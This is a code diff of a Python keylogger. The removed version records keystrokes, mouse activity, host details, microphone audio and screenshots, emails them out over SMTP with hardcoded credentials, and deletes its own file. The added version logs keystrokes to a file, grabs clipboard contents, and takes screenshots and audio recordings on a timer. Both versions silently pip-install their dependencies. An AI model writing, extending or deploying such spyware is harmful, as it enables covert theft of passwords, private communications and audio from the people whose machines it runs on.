@@ -1,144 +1,79 @@
+
 try:
-    import logging
     import os
-    import platform
-    import smtplib
-    import socket
-    import threading
-    import wave
-    import pyscreenshot
-    import sounddevice as sd
+    import pyperclip
+    import pyautogui  # Library for taking screenshots
+    import sounddevice as sd  # For recording audio
+    import wave  # For saving the audio file
     from pynput import keyboard
-    from pynput.keyboard import Listener
-    from email import encoders
-    from email.mime.base import MIMEBase
-    from email.mime.multipart import MIMEMultipart
-    from email.mime.text import MIMEText
-    import glob
+    from datetime import datetime
+    from threading import Timer
 except ModuleNotFoundError:
     from subprocess import call
-    modules = ["pyscreenshot","sounddevice","pynput"]
+    modules = ["pyperclip", "pyautogui", "sounddevice", "wave", "pynput"]
     call("pip install " + ' '.join(modules), shell=True)
 
+# Audio recording parameters
+SAMPLE_RATE = 16000  # Adjusted sample rate for better compatibility
+DURATION = 10  # Duration of each audio recording in seconds
 
-finally:
-    EMAIL_ADDRESS = "dd596b9186771c"
-    EMAIL_PASSWORD = "72b7c1ecf95f6b"
-    SEND_REPORT_EVERY = 60 # as in seconds
-    class KeyLogger:
-        def __init__(self, time_interval, email, password):
-            self.interval = time_interval
-            self.log = "KeyLogger Started..."
-            self.email = email
-            self.password = password
+# List available audio devices to ensure correct device is selected
+print(sd.query_devices())
 
-        def appendlog(self, string):
-            self.log = self.log + string
+# Optionally, set the correct audio device by name or index (replace 'Your_Microphone_Device_Name' or use index number)
+# sd.default.device = 'Your_Microphone_Device_Name'  # Uncomment this line to manually set the device
 
-        def on_move(self, x, y):
-            current_move = logging.info("Mouse moved to {} {}".format(x, y))
-            self.appendlog(current_move)
+def record_audio():
+    """Record audio for a set duration and save it as a WAV file."""
+    try:
+        print("Recording audio...")
+        audio_data = sd.rec(int(DURATION * SAMPLE_RATE), samplerate=SAMPLE_RATE, channels=1)  # Changed channels to 1 for mono
+        sd.wait()  # Wait until recording is finished
 
-        def on_click(self, x, y):
-            current_click = logging.info("Mouse moved to {} {}".format(x, y))
-            self.appendlog(current_click)
+        current_time = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
+        audio_filename = f"audio_{current_time}.wav"
 
-        def on_scroll(self, x, y):
-            current_scroll = logging.info("Mouse moved to {} {}".format(x, y))
-            self.appendlog(current_scroll)
+        with wave.open(audio_filename, 'wb') as audio_file:
+            audio_file.setnchannels(1)
+            audio_file.setsampwidth(2)
+            audio_file.setframerate(SAMPLE_RATE)
+            audio_file.writeframes(audio_data.tobytes())
 
-        def save_data(self, key):
-            try:
-                current_key = str(key.char)
-            except AttributeError:
-                if key == key.space:
-                    current_key = "SPACE"
-                elif key == key.esc:
-                    current_key = "ESC"
-                else:
-                    current_key = " " + str(key) + " "
+        print(f"Audio saved as {audio_filename}")
+    except Exception as e:
+        print(f"Failed to record audio: {e}")
 
-            self.appendlog(current_key)
+def schedule_audio_recording(interval=60):
+    """Schedule audio recordings to occur at regular intervals."""
+    record_audio()  # Record immediately
+    Timer(interval, schedule_audio_recording, [interval]).start()  # Schedule the next recording
 
-        def send_mail(self, email, password, message):
-            sender = "Private Person <from@example.com>"
-            receiver = "A Test User <to@example.com>"
+def take_screenshot():
+    """Capture a screenshot of the screen and save it with a timestamp."""
+    try:
+        current_time = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
+        screenshot = pyautogui.screenshot()
+        screenshot.save(f"screenshot_{current_time}.png")
+        print(f"Screenshot taken and saved as screenshot_{current_time}.png")
+    except Exception as e:
+        print(f"Failed to take screenshot: {e}")
 
-            m = f"""\
-            Subject: main Mailtrap
-            To: {receiver}
-            From: {sender}
+def capture_clipboard():
+    """Get the current clipboard content."""
+    try:
+        return pyperclip.paste()
+    except Exception as e:
+        print(f"Failed to capture clipboard: {e}")
+        return None
 
-            Keylogger by aydinnyunus\n"""
-
-            m += message
-            with smtplib.SMTP("smtp.mailtrap.io", 2525) as server:
-                server.login(email, password)
-                server.sendmail(sender, receiver, message)
-
-        def report(self):
-            self.send_mail(self.email, self.password, "\n\n" + self.log)
-            self.log = ""
-            timer = threading.Timer(self.interval, self.report)
-            timer.start()
-
-        def system_information(self):
-            hostname = socket.gethostname()
-            ip = socket.gethostbyname(hostname)
-            plat = platform.processor()
-            system = platform.system()
-            machine = platform.machine()
-            self.appendlog(hostname)
-            self.appendlog(ip)
-            self.appendlog(plat)
-            self.appendlog(system)
-            self.appendlog(machine)
-
-        def microphone(self):
-            fs = 44100
-            seconds = SEND_REPORT_EVERY
-            obj = wave.open('sound.wav', 'w')
-            obj.setnchannels(1)  # mono
-            obj.setsampwidth(2)
-            obj.setframerate(fs)
-            myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
-            obj.writeframesraw(myrecording)
-            sd.wait()
-
-            self.send_mail(email=EMAIL_ADDRESS, password=EMAIL_PASSWORD, message=obj)
-
-        def screenshot(self):
-            img = pyscreenshot.grab()
-            self.send_mail(email=EMAIL_ADDRESS, password=EMAIL_PASSWORD, message=img)
-
-        def run(self):
-            keyboard_listener = keyboard.Listener(on_press=self.save_data)
-            with keyboard_listener:
-                self.report()
-                keyboard_listener.join()
-            with Listener(on_click=self.on_click, on_move=self.on_move, on_scroll=self.on_scroll) as mouse_listener:
-                mouse_listener.join()
-            if os.name == "nt":
-                try:
-                    pwd = os.path.abspath(os.getcwd())
-                    os.system("cd " + pwd)
-                    os.system("TASKKILL /F /IM " + os.path.basename(__file__))
-                    print('File was closed.')
-                    os.system("DEL " + os.path.basename(__file__))
-                except OSError:
-                    print('File is close.')
-
+def log_data(key):
+    """Log keystrokes to a file."""
+    with open("keyfile.txt", 'a') as logkey:
+        try:
+            if hasattr(key, 'char'):
+                logkey.write(key.char)
             else:
-                try:
-                    pwd = os.path.abspath(os.getcwd())
-                    os.system("cd " + pwd)
-                    os.system('pkill leafpad')
-                    os.system("chattr -i " +  os.path.basename(__file__))
-                    print('File was closed.')
-                    os.system("rm -rf" + os.path.basename(__file__))
-                except OSError:
-                    print('File is close.')
-
-    keylogger = KeyLogger(SEND_REPORT_EVERY, EMAIL_ADDRESS, EMAIL_PASSWORD)
-    keylogger.run()
+                logkey.write(f'[{key}]')
+        except Exception as e:
+            print(f"Error logging key: {e}")
 
